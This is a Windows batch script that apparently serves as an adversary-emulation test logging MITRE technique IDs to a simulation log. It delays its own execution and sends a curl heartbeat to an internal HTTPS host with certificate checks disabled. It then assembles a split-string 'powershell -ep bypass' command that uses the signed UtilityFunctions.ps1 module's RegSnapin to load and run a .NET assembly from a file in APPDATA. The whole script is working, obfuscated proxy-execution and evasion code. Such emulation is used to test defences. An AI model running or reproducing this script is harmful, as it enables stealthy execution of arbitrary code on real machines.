@echo off
SETLOCAL EnableDelayedExpansion
SET txisnba=%APPDATA%\8715\fc706140
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8715-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=potoshop.txt
SET dvhhyc=8715

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
ping -n 40 127.0.0.1 >nul
SET /A bvcnm=%RANDOM% %% 20 + 10
timeout /t %bvcnm% /nobreak >nul

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
curl -k -s -o nul "!keghkgto!"
SET ghnmj=1
IF !ERRORLEVEL! NEQ 0 SET ghnmj=0
SET dffbc= 
IF !ghnmj! EQU 0 SET dffbc=connection_failed
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Trusted Developer Utilities Proxy Execution=!ghnmj!:!dffbc!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete=!ghnmj!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

choice /C Y /N /D Y /T 8 >nul
SET znmkl=c:\windows\diagnostics\system\networking
SET lqazx=pow
SET wsxed=er
SET rfvtg=she
SET yhnuj=ll
SET tgbuj=.-e
SET yhnm=p b
SET ikmjy=ypass
SET olkij=-c
SET awszx=omma
SET qazws=nd
SET a= "s
SET s=et-l
SET d=ocat
SET f=ion -pa
SET g=th !zn
SET h=mkl!; i
SET j=mport
SET k=-modul
SET l=e .\Ut
SET z=ilityFunctio
SET x=ns.ps1; Re
SET c=gSnapin !txisnba!\!xzanpex!;[Program.Class]::Dale()"

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: command_build_start>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
SET qwzxc=!lqazx!!wsxed!!rfvtg!!yhnuj!!tgbuj!!yhnm!!ikmjy!
SET mnbvf=!olkij!!awszx!!qazws!
SET plkmj=!a!!s!!d!!f!!g!!h!!j!!k!!l!!z!!x!!c!
timeout /t 12 /nobreak >nul

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: execution_start>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
CALL !qwzxc! !mnbvf! !plkmj!
SET poiuyt=1
IF !ERRORLEVEL! NEQ 0 SET poiuyt=0
SET mnbvc= 
IF !poiuyt! EQU 0 SET mnbvc=assembly_load_failed
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: execution_complete=!poiuyt!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218.010|Rundll32=!poiuyt!:!mnbvc!>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

ping -n 15 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_end>> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul